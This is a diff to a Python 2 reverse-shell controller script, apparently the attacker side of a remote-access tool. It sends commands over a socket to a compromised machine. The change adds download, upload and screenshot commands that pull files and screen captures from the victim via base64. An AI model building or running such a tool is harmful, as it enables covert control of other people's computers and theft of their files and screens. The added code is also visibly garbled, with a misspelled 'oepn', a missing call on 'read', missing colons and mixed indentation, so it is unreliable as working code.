@@ -10,7 +10,7 @@
                                                  
 import socket  #importing socket library to so that we can create and set socket
 import json    #importing json library because by default socket.recv(1024) can recieve only 1024 bytes output so that it cant recieve whole output for some commands
-
+import base64
 #Defining big_send() and big_recv() using json object so that we can dump data into json_data and display it that helps to cross that socket.recv(1024) boundry
 def big_send(data):
 	json_data = json.dumps(data)
@@ -57,13 +57,37 @@ def server():
 # defining shell function to sending msgs and recieving result
 
 def shell():
+    global count
 	while True:                                     # we have to loop it because either we can't run morethen one command
 		cmd = raw_input("SHELL~#$ %s" % str(ip))    
 		big_send(cmd)	
 		if cmd == "q":                              # when type q it will close the connection
 			print("Terminating connection from server.....")
 			break
-		else :
+        elif cmd[:2] == "cd":
+            continue    
+        elif cmd[:8] == "download":
+               with open(cmd[9:], "wb") as file:
+                   result = base64.b64decode(big_recv())
+                   file.write(result)
+                   print("[+] Downloaded")
+        elif cmd[:6] == "upload":
+            try:
+                with oepn(cmd[7:], "rb") as fin:
+                    big_send(base64.b64encode(fin.read))
+            except:
+                failed = "Failed to Upload"
+                big_send(base64.b64encode(failed))
+        elif cmd[:10] == "screenshot":
+            with open("screenshot%d" % count, "wb") as screen
+                image = big_recv()
+                image_decoded = base64.b64decode(image)
+                if image_decoded[:4] == "[!!]"
+                    print(image_decoded)
+                else:
+                    screen.write(image_decoded)
+                    count += 1
+        else :
 			result = big_recv()
 			print(result)
 
